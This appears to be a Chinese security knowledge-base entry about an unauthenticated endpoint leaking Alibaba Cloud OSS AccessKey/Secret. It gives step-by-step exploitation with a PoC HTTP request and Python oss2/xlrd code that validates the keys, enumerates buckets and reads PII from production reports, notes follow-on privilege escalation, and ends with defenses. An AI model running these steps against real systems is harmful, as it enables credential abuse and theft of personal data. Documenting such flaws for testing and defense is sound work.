---
id: cloud-cloud-iam-oss-ak-sk-leak-bucket-pii-proof
title: 未授权接口泄露阿里云 OSS AK/SK：oss2 验证、Bucket 枚举与生产报表 PII 取证
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: aliyun-oss-ak-sk-leak-enumeration-pii
tags:
- cloud
- aliyun
- oss
- accesskey
- credential-leak
- unauth
- bucket-enumeration
- pii
- oss2
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V68
  verified_at: '2026-11-05T11:53:24+08:00'
  notes: 已对照原文核对：空请求 POST /fileOss/getOssConfig 返回 bucketName/endpoint/AK/SK、非标端口 12005、oss2 Auth/Service/list_buckets、按报表扩展名枚举、xlrd 解析表头确认姓名+手机号+地址、单份 11.4MB/60002 行/54446 个手机号抽样、数十万级量与报告脱敏要求，均与原文一致。原文正文自相矛盾：文字要求用 list_objects 而非 ObjectIterator（max_keys 是每页数量），示例却写 ObjectIterator(bucket, max_keys=1000) 且会翻到底；已将 PoC 修正为 bucket.list_objects(max_keys=1000).object_list。未验证点：原文无图片、无真实 AK/SK，未复现云 API 调用；无产品版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-oss-ak-sk-leak-bucket-pii-proof/
draft: false
kb_aliases:
- OSS AccessKey 泄露
- getOssConfig 未授权
- 阿里云 AK/SK 验证
- oss2 list_buckets
- OSS Bucket 枚举
- 对象存储 PII 取证
---

## 一句话结论

订购系统的未授权配置接口直接返回阿里云 OSS 的 `AccessKeyId`/`secretAccessKey`；拿到长期密钥后，用 oss2 `list_buckets` 验证有效性、用 `list_objects` 枚举生产报表并解析出姓名+手机号+地址等 PII，即可把“密钥能用”坐实为批量个人信息泄露（高危）。

## 原理

- OSS 的 AK/SK 是长期身份凭据，oss2/AWS SDK 每次请求都用它做签名；攻击者从公网即可直接调用对象存储 API，无需进入目标网络，权限等同于该 RAM 用户/主账号。
- 配置类接口常把 bucketName、endpoint、AK、SK 一并返回给前端，若接口本身漏做鉴权，空请求即可读取完整密钥；真实后端常挂在非标端口（如 12005），443 上的前端只是静态壳。
- `list_buckets` 能成功返回说明密钥真实有效且具备列举权限；`list_objects` 能返回对象列表说明对该桶有读权限。两者组合即可确认可利用性。
- 生产报表（订单/销售/对账/发票）通常被导出到对象存储，文件名和扩展名可直接筛选；`.xls` 用 xlrd 解析后能确认表头含姓名、手机号、金额、收货地址等字段。
- 定级关键不是“拿到密钥”，而是证明桶内存在真实生产数据且含批量三元组 PII；仅能读写自己上传的测试文件通常不被认定为高危。

## 触发条件

- 存在未授权的配置/初始化接口（或前端 JS、`.git`、heapdump、环境变量、CI 日志）泄露 OSS AK/SK。
- 密钥仍有效、未绑定源 IP/MFA/过期限制，所属账号具备 `ListBuckets`、`ListObjects`、`GetObject` 等权限。
- Bucket 中存放生产导出报表、备份或凭证图片等真实业务数据。
- 报表格式可解析（.xls/.xlsx/.csv/.gz），且字段包含 PII。

## 利用步骤

1. 从非标端口或前端配置定位接口，例如空 JSON 请求 `POST /fileOss/getOssConfig`，记录返回的 `bucketName`、`endpoint`、`accessKeyId`、`secretAccessKey`。
2. 用 oss2 构造 `Auth` 与 `Service`，调用 `list_buckets()`；能列出桶即密钥有效。
3. 对目标桶用 `list_objects(max_keys=1000)` 枚举前 1000 个对象，按前缀/扩展名识别报表、备份、导出目录；不要用 `ObjectIterator` 无上限翻页，避免请求量和数据量失控。
4. 下载少量样本报表（如 1-2 份），用 xlrd/pandas 读取表头与行数，确认是否含姓名、手机号、地址等字段。
5. 抽样统计 PII 数量级（如单份 11MB 报表 6 万行、5.4 万个手机号），结合桶内同类报表数量估算总量，按“数十万级”量级描述。
6. 报告中保留 `TotalItems`/对象列表响应作为可复现证据，手机号打码并保留一条完整样本证明真实性；避免全量下载。

## PoC

```http
POST /fileOss/getOssConfig HTTP/1.1
Host: example.com:12005
Content-Type: application/json

{}
```

```json
{
  "code": 0,
  "msg": "success",
  "data": {
    "bucketName": "retail-bucket",
    "endpoint": "oss-cn-beijing.aliyuncs.com",
    "accessKeyId": "LTAIxxxxxxxxxxxxxxxx",
    "secretAccessKey": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  }
}
```

```python
import oss2

auth = oss2.Auth("LTAIxxxxxxxxxxxxxxxx", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
service = oss2.Service(auth, "https://oss-cn-beijing.aliyuncs.com")
for b in service.list_buckets().buckets:
    print(b.name, b.location)

bucket = oss2.Bucket(auth, "https://oss-cn-beijing.aliyuncs.com", "retail-bucket")
# list_objects 只取一页（max_keys 是每页数量，不是总数）
for obj in bucket.list_objects(max_keys=1000).object_list:
    print(obj.key, obj.size)
```

```python
import xlrd

wb = xlrd.open_workbook("订单报表.xls")
sh = wb.sheet_by_index(0)
print("行数:", sh.nrows, "列数:", sh.ncols)
for c in range(sh.ncols):
    print(sh.cell_value(0, c), end=" | ")
```

## 变体与关联

- **其他云**：AWS S3 用 boto3 `list_buckets`/`list_objects_v2`，腾讯云 COS 用 cos-python-sdk，MinIO 用 mc/S3 兼容 API；思路相同。
- **密钥来源**：未授权配置接口、前端 JS 硬编码、`.git` 历史、Spring Boot `/env`/`heapdump`、CI 日志、环境变量、源码仓库。
- **权限扩展**：密钥若具备写权限可覆盖对象/投毒；具备 RAM 权限可进一步创建 AccessKey、提权或跨账号。
- **定级边界**：仅验证“能连上/能读写自己传的文件”不构成高危，必须落到真实生产 PII；报告数据量克制，避免被判为脱库。
- **关联**：[[cloud-cloud-iam-aws-access-key-leak-search-engine-takeover]]（AWS AK/SK 泄露与接管）、[[cloud-object-storage-bucket-acl-misconfig]]（Bucket ACL 公共读枚举）。

## 检测与防御

- 配置接口强制鉴权，绝不向前端返回 `secretAccessKey`；前端只应拿 STS 临时凭据或预签名 URL。
- 使用 RAM 子账号 + 最小权限策略，按 bucket/前缀限制 `ListObjects`/`GetObject`；开启 MFA、源 IP 限制与短期轮换。
- Bucket 默认私有，关闭公共读/公共写；对敏感报表启用 KMS 加密与访问日志。
- 监控异常 `ListBuckets`/`ListObjects` 调用、非业务源 IP 的 OSS API 访问、短时间大量对象列举与下载；CloudTrail/OSS 访问日志接入告警。
- 定期扫描前端 JS、仓库与镜像中的 AK/SK 特征（`LTAI` 前缀等），发现即轮换并排查泄露面。
